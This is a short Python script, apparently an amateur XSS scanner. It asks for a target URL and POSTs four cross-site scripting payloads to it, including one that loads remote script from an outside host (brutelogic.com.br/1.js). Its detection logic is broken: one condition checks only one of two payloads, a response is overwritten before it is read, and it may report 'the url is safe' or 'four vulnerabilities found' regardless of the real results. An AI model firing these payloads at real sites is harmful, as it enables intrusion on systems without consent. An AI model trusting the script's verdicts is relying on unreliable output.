import requests
from pyfiglet import print_figlet
from colorama import Fore

colors = "10;100;127:"

print_figlet(" X S S", font="small", colors=colors)

target = input(Fore.GREEN+"Enter the url:")
print(Fore.BLUE+"\n[+] Testing url .......")

payload1 = "<script> alert('xss'); </script>"
payload2 = "<script src=//brutelogic.com.br/1.js>"
payload3 = "<x onmouseout=alert(1)>hover this!"
payload4 = '<b onkeypress="alert(1)" contenteditable>test</b>'

req = requests.post(target+payload1)
req = requests.post(target+payload2)
req2 = requests.post(target+payload3)
req3 = requests.post(target+payload4)

if payload1 and payload2 in req.text:
	print(Fore.LIGHTRED_EX+"\nAttacking payload 1: "+payload1)
	print(Fore.LIGHTRED_EX + "\nAttacking payload 2: " + payload2)
if payload3 in req2.text:
	print(Fore.LIGHTRED_EX + "\nAttacking payload 3: " + payload3)
if payload4 in req3.text:
	print(Fore.LIGHTRED_EX + "\nAttacking payload 4: " + payload4)
	print(Fore.LIGHTRED_EX+"\n 4 types of xss vulnerabilities found!!!!!")
else:
	print(Fore.WHITE+"\n\nThe url is safe ")
